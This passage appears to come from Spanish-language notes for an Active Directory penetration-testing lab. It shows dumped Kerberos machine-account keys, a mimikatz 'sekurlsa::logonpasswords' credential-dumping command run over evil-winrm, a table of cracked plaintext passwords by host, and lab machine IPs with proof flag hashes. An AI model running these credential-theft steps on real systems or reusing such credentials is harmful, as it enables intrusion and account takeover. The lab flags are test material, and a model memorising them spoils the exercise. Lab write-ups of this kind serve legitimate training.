DEV04$:aes128-cts-hmac-sha1-96:b5f8f002fb35288570c3539f4b671c55
DEV04$:des-cbc-md5:b3d097e53b29921c
CLIENT01$:aes256-cts-hmac-sha1-96:b386c7e21284c6cefd4c8e3e7269c921be66e1bcff62d7e8385b391f48ff5380
CLIENT01$:aes128-cts-hmac-sha1-96:0fc48734ab9202bef24aa6ae9c9d6440
CLIENT01$:des-cbc-md5:940b67c4ade0f43d
PROD01$:aes256-cts-hmac-sha1-96:fd8e97f0f2ff51199a6cff569db9a3e45d8baaeb8248da79cd85c54134709bc5
PROD01$:aes128-cts-hmac-sha1-96:658b59c3de9e8cc33345b4ef1646aca8
PROD01$:des-cbc-md5:76706dab68f2d034
CLIENT02$:aes256-cts-hmac-sha1-96:4befec9c52f3ee0dc791194640d5a3428bd677d50c5c32ee6173a3c8bf4dfcfb
CLIENT02$:aes128-cts-hmac-sha1-96:28894b9cd6a3cebdd600200457e43b19
CLIENT02$:des-cbc-md5:088cf4d937526dc2
WEB02$:aes256-cts-hmac-sha1-96:76964700a2d1a417095c9b86a09e2b733975ca63b216ab76f11ef56cbe8e4bc6
WEB02$:aes128-cts-hmac-sha1-96:de35505aee11fdd5368e14873330aba2
WEB02$:des-cbc-md5:3275a201ef9da8fd
[*] Cleaning up... 

```

## Troubleshooting
evil-winrm + mimikatz
```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
### Utils

```powershell
(Get-Command <utilidad del modulo>).Parameters
# ejemplo con comando de powerview
(Get-Command Get-DomainUser).Parameters
```

### 🔐 Tabla 2: Credenciales Descubiertas
---
| Usuario       | Hostname | Contraseña          |
| ------------- | -------- | ------------------- |
| nt service\mssql$sqlexpress | WEB02 |          |
| Administrator | WEB02    | point145dream       |
| joe           | FILES02  | Flowers1            |
| wario         | CLIENT02 | Mushroom!           |
| offsec        | VPN/WEB01| password - century62hisan51 |
| mario         | NTP      | id_rsa              |
| yoshi         | DEV04/CLIENT01| Mushroom!      |
| leon          | DEV04/DC01 | rabbit:)          |
| Administrator | DC01     | denZV00Zwtpax57.    |

### 📘 Tabla 1: Resumen de Máquinas
---
| IP              | Hostname  | Proof | Local |
| --------------- | --------- | ----- | ----- |
| 192.168.170.120 | WEB01     | 664f2b67273c947856978e09d353ff73 | ❌     |
| 192.168.170.121 | WEB02     | ba85bac13a36e67690a693dc388ae69f | ❌     |
| 192.168.170.122 | VPN       | 6304e7155658241b7c8953c7fb10ce3f | 68d26dc77fdb06223380e88b299ee42e |
| 172.16.156.10   | DC01      | 4eb44512883c4720f2f2cb16fe8d2744 | ❌     |
| 172.16.156.11   | FILES02   | b6469ba66f5608a475a8cb68459aef0e | 4a53568a7f0201167c4291f462a4abab |
| 172.16.156.12   | DEV04     | 22020928c7b252b251e74d7778d68149 | 3ceb37eea6ad5dbde05c24dd124ad313 |
| 172.16.156.13   | PROD01    | e668fa606872e110856d39558530f7cd | ❌     |
| 172.16.156.14   | NTP       | ❌     | 96d63c6f4937ce61639742d211e160c5 |
| 172.16.156.82   | CLIENT01  | 64380f427eb5da3ef294bdc06dca0cfe | ❌     |
| 172.16.156.83   | CLIENT02  | 5d2ed5e3c934a9bbe8f13c9e1a4bcfe0 | 33f13a17e218cbd0198ed8dbe6ba332e |
